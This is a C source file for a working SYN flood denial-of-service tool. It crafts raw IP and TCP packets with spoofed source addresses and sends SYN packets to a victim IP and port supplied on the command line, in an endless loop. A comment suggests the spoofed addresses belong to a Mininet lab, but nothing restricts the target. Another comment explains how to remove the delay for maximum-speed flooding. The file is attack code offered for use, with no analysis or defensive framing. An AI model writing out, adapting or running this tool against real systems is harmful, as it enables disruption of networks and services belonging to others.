#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>

#define PACKET_SIZE 4096

// Checksum calculation
unsigned short checksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return(answer);
}

// TCP pseudo header for checksum
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

int main(int argc, char *argv[])
{
    if (argc != 3) {
        printf("Usage: %s <victim_ip> <victim_port>\n", argv[0]);
        return -1;
    }

    char *victim_ip = argv[1];
    int victim_port = atoi(argv[2]);

    printf("Starting SYN flood attack towards %s:%d\n", victim_ip, victim_port);

    // Raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed. Run as root!");
        return 1;
    }

    char packet[PACKET_SIZE];
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(victim_port);
    dest.sin_addr.s_addr = inet_addr(victim_ip);

    // Tell kernel we provide IP header
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        return 1;
    }

    // Spoofed agent IPs (4 hosts in Mininet)
    char *spoofed_ips[] = {
        "10.0.0.2",
        "10.0.0.3",
        "10.0.0.4",
        "10.0.0.5"
    };

    while (1) {
        for (int i = 0; i < 4; i++) {
            memset(packet, 0, PACKET_SIZE);

            // ---------- IP HEADER ----------
            ip->ihl = 5;
            ip->version = 4;
            ip->tos = 0;
            ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
            ip->id = htons(rand() % 65535);
            ip->frag_off = 0;
            ip->ttl = 64;
            ip->protocol = IPPROTO_TCP;
            ip->check = 0;
            ip->saddr = inet_addr(spoofed_ips[i]);  // spoofed IP
            ip->daddr = dest.sin_addr.s_addr;

            ip->check = checksum((unsigned short *)packet, ip->tot_len);

            // ---------- TCP HEADER ----------
            tcp->source = htons(rand() % 65535);     // random source port
            tcp->dest = htons(victim_port);
            tcp->seq = random();
            tcp->ack_seq = 0;
            tcp->doff = 5;  // TCP header size
            tcp->syn = 1;   // SYN flag
            tcp->window = htons(5840);
            tcp->check = 0;
            tcp->urg_ptr = 0;

            // ---------- TCP checksum ----------
            struct pseudo_header psh;
            psh.source_address = ip->saddr;
            psh.dest_address = ip->daddr;
            psh.placeholder = 0;
            psh.protocol = IPPROTO_TCP;
            psh.tcp_length = htons(sizeof(struct tcphdr));

            char pseudo_packet[PACKET_SIZE];
            memcpy(pseudo_packet, &psh, sizeof(psh));
            memcpy(pseudo_packet + sizeof(psh), tcp, sizeof(struct tcphdr));

            tcp->check = checksum((unsigned short *)pseudo_packet,
                                  sizeof(psh) + sizeof(struct tcphdr));

            // ---------- Send packet ----------
            if (sendto(sock, packet, ip->tot_len, 0,
                (struct sockaddr *)&dest, sizeof(dest)) < 0) {
                perror("sendto failed");
            }

            printf("Sent SYN from spoofed IP %s\n", spoofed_ips[i]);
        }

        // Remove if you want maximum-speed flooding
        usleep(1000);  // 1 ms delay
    }

    close(sock);
    return 0;
}

